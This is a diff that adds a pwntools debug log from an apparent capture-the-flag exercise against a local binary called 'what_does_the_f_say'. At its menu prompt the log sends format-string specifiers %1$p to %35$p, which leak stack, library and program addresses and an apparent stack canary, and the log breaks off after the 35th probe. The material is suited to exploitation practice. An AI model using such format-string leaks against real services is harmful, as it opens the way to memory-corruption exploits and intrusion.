@@ -1,0 +1,1023 @@
+[x] Starting local process './what_does_the_f_say' argv=[b'./what_does_the_f_say'] 
+[+] Starting local process './what_does_the_f_say' argv=[b'./what_does_the_f_say'] : pid 625
+[DEBUG] Received 0x56 bytes:
+    b'\n'
+    b'Welcome to Fox space bar!\n'
+    b'\n'
+    b'Current space rocks: 69.69\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x5 bytes:
+    b'%1$p\n'
+[DEBUG] Received 0x68 bytes:
+    b'0x7fffffffe1c0\n'
+    b'\n'
+    b'Enjoy your Kryptonite vodka!\n'
+    b'\n'
+    b'Current space rocks: 62.79\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x5 bytes:
+    b'%2$p\n'
+[DEBUG] Received 0x5e bytes:
+    b'0x1d\n'
+    b'\n'
+    b'Enjoy your Kryptonite vodka!\n'
+    b'\n'
+    b'Current space rocks: 55.89\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x5 bytes:
+    b'%3$p\n'
+[DEBUG] Received 0x68 bytes:
+    b'0x7ffff7e99992\n'
+    b'\n'
+    b'Enjoy your Kryptonite vodka!\n'
+    b'\n'
+    b'Current space rocks: 48.99\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x5 bytes:
+    b'%4$p\n'
+[DEBUG] Received 0x5e bytes:
+    b'0x19\n'
+    b'\n'
+    b'Enjoy your Kryptonite vodka!\n'
+    b'\n'
+    b'Current space rocks: 42.09\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x5 bytes:
+    b'%5$p\n'
+[DEBUG] Received 0x5f bytes:
+    b'(nil)\n'
+    b'\n'
+    b'Enjoy your Kryptonite vodka!\n'
+    b'\n'
+    b'Current space rocks: 35.19\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x5 bytes:
+    b'%6$p\n'
+[DEBUG] Received 0x5f bytes:
+    b'(nil)\n'
+    b'\n'
+    b'Enjoy your Kryptonite vodka!\n'
+    b'\n'
+    b'Current space rocks: 28.29\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x5 bytes:
+    b'%7$p\n'
+[DEBUG] Received 0x46 bytes:
+    b'0x2ffffe1f0\n'
+    b'\n'
+    b'Enjoy your Kryptonite vodka!\n'
+    b'\n'
+    b'Current space rocks: 21.39\n'
+[DEBUG] Received 0x1f bytes:
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x5 bytes:
+    b'%8$p\n'
+[DEBUG] Received 0x2a bytes:
+    b'0xa70243825\n'
+    b'\n'
+    b'Enjoy your Kryptonite vodka!\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x5 bytes:
+    b'%9$p\n'
+[DEBUG] Received 0x4b bytes:
+    b'(nil)\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%10$p\n'
+[DEBUG] Received 0x4b bytes:
+    b'(nil)\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%11$p\n'
+[DEBUG] Received 0x4b bytes:
+    b'(nil)\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%12$p\n'
+[DEBUG] Received 0x49 bytes:
+    b'0x1\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%13$p\n'
+[DEBUG] Received 0x58 bytes:
+    b'0x5a8ae296252e2a00\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%14$p\n'
+[DEBUG] Received 0x54 bytes:
+    b'0x7fffffffe210\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%15$p\n'
+[DEBUG] Received 0x54 bytes:
+    b'0x55555555574a\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%16$p\n'
+[DEBUG] Received 0x51 bytes:
+    b'0x100000000\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%17$p\n'
+[DEBUG] Received 0x58 bytes:
+    b'0x5a8ae296252e2a00\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%18$p\n'
+[DEBUG] Received 0x54 bytes:
+    b'0x7fffffffe240\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%19$p\n'
+[DEBUG] Received 0x54 bytes:
+    b'0x555555555841\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%20$p\n'
+[DEBUG] Received 0x54 bytes:
+    b'0x7fffffffe358\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%21$p\n'
+[DEBUG] Received 0x51 bytes:
+    b'0x100000000\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%22$p\n'
+[DEBUG] Received 0x4b bytes:
+    b'(nil)\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%23$p\n'
+[DEBUG] Received 0x58 bytes:
+    b'0x5a8ae296252e2a00\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%24$p\n'
+[DEBUG] Received 0x49 bytes:
+    b'0x1\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%25$p\n'
+[DEBUG] Received 0x54 bytes:
+    b'0x7ffff7daed90\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%26$p\n'
+[DEBUG] Received 0x4b bytes:
+    b'(nil)\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%27$p\n'
+[DEBUG] Received 0x54 bytes:
+    b'0x55555555580a\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%28$p\n'
+[DEBUG] Received 0x51 bytes:
+    b'0x100000000\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%29$p\n'
+[DEBUG] Received 0x54 bytes:
+    b'0x7fffffffe358\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%30$p\n'
+[DEBUG] Received 0x4b bytes:
+    b'(nil)\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%31$p\n'
+[DEBUG] Received 0x58 bytes:
+    b'0xf1e67f5da837a2ac\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%32$p\n'
+[DEBUG] Received 0x54 bytes:
+    b'0x7fffffffe358\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%33$p\n'
+[DEBUG] Received 0x54 bytes:
+    b'0x55555555580a\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%34$p\n'
+[DEBUG] Received 0x4b bytes:
+    b'(nil)\n'
+    b'\n'
+    b'You have less than 20 space rocks! Are you sure you want to buy it?\n'
+[DEBUG] Sent 0x2 bytes:
+    b'n\n'
+[DEBUG] Received 0x3b bytes:
+    b'\n'
+    b'Current space rocks: 14.49\n'
+    b'\n'
+    b'1. Space drinks\n'
+    b'2. Space food\n'
+[DEBUG] Sent 0x2 bytes:
+    b'1\n'
+[DEBUG] Received 0x5c bytes:
+    b'\n'
+    b'1. Milky way (4.90 s.rocks)\n'
+    b'2. Kryptonite vodka (6.90 s.rocks)\n'
+    b'3. Deathstar(70.00 s.rocks)\n'
+[DEBUG] Sent 0x2 bytes:
+    b'2\n'
+[DEBUG] Received 0x1a bytes:
+    b'\n'
+    b'Red or Green Kryptonite?\n'
+[DEBUG] Sent 0x6 bytes:
+    b'%35$p\n'
+[DEBUG] Received 0x54 bytes:
+    b'0x7ffff7ffd040\n'
+    b'\n'
